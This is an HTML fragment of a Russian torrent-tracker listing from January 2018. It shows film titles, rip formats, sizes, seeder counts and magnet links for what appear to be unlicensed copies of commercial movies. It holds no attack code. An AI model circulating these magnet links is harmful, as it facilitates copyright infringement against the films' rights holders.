+<td align="right">1.60&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;925</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;43</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606954"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3a0c135494c2a662b8d5649e2a0fcca531300768&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606954/loskutnoe-odejalo_how-to-make-an-american-quilt-1995-bdrip-720p-ot-korsar-p-a">Лоскутное одеяло / How to Make an American Quilt (1995) BDRip 720p от KORSAR | P, A </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">5.06&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606942"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8416d84e3c842960a17d3280c08740ef725f938c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606942/dolores-kljejborn_dolores-claiborne-1995-bdrip-720p-ot-hellywood-p2-p-a">Долорес Клэйборн / Dolores Claiborne (1995) BDRip 720p от HELLYWOOD | P2, P, A </a></td> <td align="right">6<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.95&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;17</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606934"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8b681b48b5a4fb0fe9c2f3998d7b238b20cbabb2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606934/prowaj-kristofer-robin_goodbye-christopher-robin-2017-hdrip-itunes">Прощай, Кристофер Робин / Goodbye Christopher Robin (2017) HDRip | iTunes </a></td> 
+<td align="right">2.05&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;55</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/565277"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:782f3f14d4344c9a3042b137688bf88c0fea25e0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/565277/baffi-istrebitelnica-vampirov_buffy-the-vampire-slayer-1992-bdrip-720p-ot-k.e.n-nnmclub-p2-a">Баффи - истребительница вампиров / Buffy the Vampire Slayer (1992) BDRip 720p от k.e.n &amp; NNMClub | P2, A </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">4.37&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606927"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:64127024c950ed7024e70019c52917232734e5f0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606927/borg/makinroj_borg-mcenroe-2017-hdrip-itunes">Борг/Макинрой / Borg McEnroe (2017) HDRip | iTunes </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.37&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;68</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606933"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f403c6a797307879d3a2a0f8080255b4e74593dd&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606933/mest-rozovoj-pantery_revenge-of-the-pink-panther-1978-bdrip-720p-d-p-r2-a">Месть Розовой пантеры / Revenge of the Pink Panther (1978) BDRip 720p | D, P, Р2, А </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">13.16&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606893"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c1354e2dfa88b1814ef81dd88c4639cd301fd92a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606893/mimikrija_jangsanbeom_jang-san-beom-2017-webrip-720p-l1">Мимикрия / Jangsanbeom / Jang-san-beom (2017) WEBRip 720p | L1 </a></td> <td align="right">7<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.23&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;85</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;10</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606895"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ae30183ca22b1d460b1587e1aa64cf9252b5c40e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606895/umri-dorogusha_die-my-dear-2017-webrip-l1">Умри дорогуша / Die, My Dear (2017) WEBRip | L1 </a></td> <td align="right">6<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">766.48&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;77</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606932"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c5e0f113e07a762846f76c8688fec9e5c3e3c8a1&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606932/mest-rozovoj-pantery_revenge-of-the-pink-panther-1978-bdremux-1080p-d-p-r2-a">Месть Розовой пантеры / Revenge of the Pink Panther (1978) BDRemux 1080p | D, P, Р2, А </a></td> 
+<td align="right">25.60&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/600005"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e83950012a850df50a9b7706e1e170052c899870&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/600005/dzhungli_jungle-2017-bdrip-hevc-1080p-ot-hevc-club-itunes">Джунгли / Jungle (2017) BDRip-HEVC 1080p от HEVC CLUB | iTunes </a></td> <td align="right">10<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">5.79&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;250</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;30</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606897"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f422b0f8a25f33b4f1eb8e06a2dde57d15369d16&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606897/doroga-apokalipsisa_apocalypse-road-2016-webrip-avc-l1">Дорога апокалипсиса / Apocalypse Road (2016) WEBRip-AVC | L1 </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">734.73&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/122531"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f555202a70d9b3a084ffaed089c4bf602e2dd378&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/122531/volk_loup-2009-hdrip-l1">Волк / Loup (2009) HDRip | L1 </a></td> <td align="right">6<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.47&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;12</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606912"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0577e3a8cd391d8c3a273ac418c804e690d8035a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606912/bjetmen-protiv-supermena-na-zare-spravedlivosti_batman-v-superman-dawn-of-justice-2016-uhd-bdremux-2160p-4k-hdr-d-p-a-l">Бэтмен против Супермена: На заре справедливости / Batman v Superman: Dawn of Justice (2016) UHD BDRemux 2160p | 4K | HDR | D, P, A, L </a></td> <td align="right">11<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">119.48&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;12</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;11</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606911"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4ffd23d2dd603bcb417e004bf72b2db93d6358d5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606911/associacija-zloumyshlennikov_association-de-malfaiteurs-1987-hdtv-1080i-d-p2">Ассоциация злоумышленников / Association de malfaiteurs (1987) HDTV 1080i | D, P2 </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">6.32&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;14</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606907"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ce62582b2b2883ab165a1c1fb505cc538700f7c5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606907/dvenadcatiletnij-pirat_un-pirata-de-doce-anos-1972-dvdrip-l-1">Двенадцатилетний пират / Un pirata de doce anos (1972) DVDRip | L 1 </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;16</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606906"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e30e856612c1260c2c95a6e54bcf922cd15be19c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606906/udacha-logana_logan-lucky-2017-bdrip-720p-ot-k.e.n-megapeer-d-a-itunes">Удача Логана / Logan Lucky (2017) BDRip 720p от k.e.n &amp; MegaPeer | D, A | iTunes </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">4.69&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;105</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606902"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:93e4a46074ddfb52aa765b701065066664f66451&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606902/megrje-na-monmartre_maigret-in-montmartre-2017-hdtvrip-l">Мегрэ на Монмартре / Maigret in Montmartre (2017) HDTVRip | L </a></td> <td align="right">6<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.44&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;455</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;21</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606904"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a9ed19fafa34bd09ce5e8c9ff5475fb1e9678bf0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606904/snegovik_jack-frost-1997-bdremux-1080p-p2-a">Снеговик / Jack Frost (1997) BDRemux 1080p | P2, A </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">21.23&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/343261"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7667ef2979af1fe7bc1dd8d40e3f32dcaf998ec7&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/343261/ohota-za-«krasnym-oktjabrem»_the-hunt-for-red-october-1990-bdrip-720p-p">Охота за «Красным Октябрем» / The Hunt for Red October (1990) BDRip 720p | P </a></td> <td align="right">9<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">4.36&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/316693"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7d84b2610481d944cb9c34f657441bea1f31e699&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/316693/cena-straha_the-sum-of-all-fears-2002-bdrip-1080p">Цена страха / The Sum of All Fears (2002) BDRip 1080p </a></td> <td align="right">13<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.76&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;15</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/259327"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:705692c6083ee3f2fa2c97114cac7ff8f26963f3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/259327/prjamaja-i-javnaja-ugroza_clear-and-present-danger-1994-bdrip-1080p">Прямая и явная угроза / Clear and Present Danger (1994) BDRip 1080p </a></td> <td align="right">9<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.76&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;9</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/260174"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:33957c3afc4ad5616b491e5dd276506b409d782c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/260174/igry-patriotov_patriot-games-1992-bdrip-1080p">Игры патриотов / Patriot Games (1992) BDRip 1080p </a></td> <td align="right">12<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.76&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;12</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606901"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a63e4da0725d7970a820698976c1b6d5cf1d5c2d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606901/chetvero-protiv-banka_vier-gegen-die-bank-2016-hdrip-avc-ot-exkinoray-itunes">Четверо против банка / Vier gegen die Bank (2016) HDRip-AVC от ExKinoRay | iTunes </a></td> 
+<td align="right">745.92&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;74</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606900"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bccf03e2ece7f309389df80cd36e1b64250a2a83&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606900/van-gog-s-ljubovju-vinsent_loving-vincent-2017-hdrip-ot-megapeer-itunes">Ван Гог. С любовью, Винсент / Loving Vincent (2017) HDRip от MegaPeer | iTunes </a></td> 
+<td align="right">769.33&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;40</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606894"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:369f4b6e078e12cbffdb54829aa00c4199b476f6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606894/molodye-policejskie_polnochnye-beglecy_young-policee_midnight-runners-2017-bdrip-1080p-ot-batafurai-team-i-clubfate-l2">Молодые полицейские / Полночные беглецы / Young Policee / Midnight Runners (2017) BDRip 1080p от Batafurai Team и ClubFate | L2 </a></td> 
+<td align="right">10.30&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;20</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606892"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:41f8b17378f8c2bda5378eefd3387b1a3c535deb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606892/chetvero-protiv-banka_vier-gegen-die-bank-2016-hdrip-ot-megapeer-itunes">Четверо против банка / Vier gegen die Bank (2016) HDRip от MegaPeer | iTunes </a></td> 
+<td align="right">745.52&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;195</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606886"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:66e29cee62704a285d10d073d4cb30fc66d07006&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606886/uvlechenie_the-crush-1993-bdremux-1080r-p2-a">Увлечение / The Crush (1993) BDRemux 1080р | P2, A </a></td> 
+<td align="right">21.67&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606875"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:202fa99469a021412db034908fd640fea92a8399&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606875/prowaj-kristofer-robin_goodbye-christopher-robin-2017-web-dlrip-avc-p-itunes">Прощай, Кристофер Робин / Goodbye Christopher Robin (2017) WEB-DLRip-AVC | P | iTunes </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.88&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;19</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606863"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d04d6a063cec327d271a932628c721f67fedd5d6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606863/ljubov-vne-pravil_leatherheads-2008-bdrip-avc-p">Любовь вне правил / Leatherheads (2008) BDRip-AVC | P </a></td> 
+<td align="right">1.35&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;15</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606864"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d3a0dcd83b4b801fb3f8a325325eeb40781a24fa&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606864/ljubov-vne-pravil_leatherheads-2008-bdrip-720p-ot-hdline-p">Любовь вне правил / Leatherheads (2008) BDRip 720p от HDLine | P </a></td> 
+<td align="right">4.32&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;17</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606866"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:285615a1b48072d508e5a34902ebf2b799635e93&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606866/ljubov-vne-pravil_leatherheads-2008-bdrip-1080p-ot-hdline-p">Любовь вне правил / Leatherheads (2008) BDRip 1080p от HDLine | P </a></td> 
+<td align="right">9.02&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606868"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3ee511e6c24402c33bae640c377b41d23fe8ad38&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606868/ljubov-vne-pravil_leatherheads-2008-bdremux-1080p-ot-hdline-p">Любовь вне правил / Leatherheads (2008) BDRemux 1080p от HDLine | P </a></td> 
+<td align="right">16.92&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606884"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8e54857a36661856413383a090190784d34016c9&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606884/kozyrnye-tuzy_smokin-aces-2006-web-dl-1080p-d-a-open-matte">Козырные тузы / Smokin&#039; Aces (2006) WEB-DL 1080p | D, A | Open Matte </a></td> <td align="right">4<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">14.14&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;22</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606883"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:aec4b904e4838816ebe2e43b7df6cffbbd8d99bf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606883/synovja-kjeti-jelder_the-sons-of-katie-elder-1965-webrip-ot-koenig-p">Сыновья Кэти Элдер / The Sons of Katie Elder (1965) WEBRip от Koenig | P </a></td> 
+<td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;16</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/477489"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2278994cf768cce254e5c0527ddbefaf2a7a4fff&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/477489/fantomas-trilogija_fantomas-trilogy-1964-1967-bdrip-1080p-d">Фантомас: Трилогия / Fantomas: Trilogy (1964-1967) BDRip 1080p | D </a></td> <td align="right">33<img src="/s/i/com.gif" alt="C" /></td>
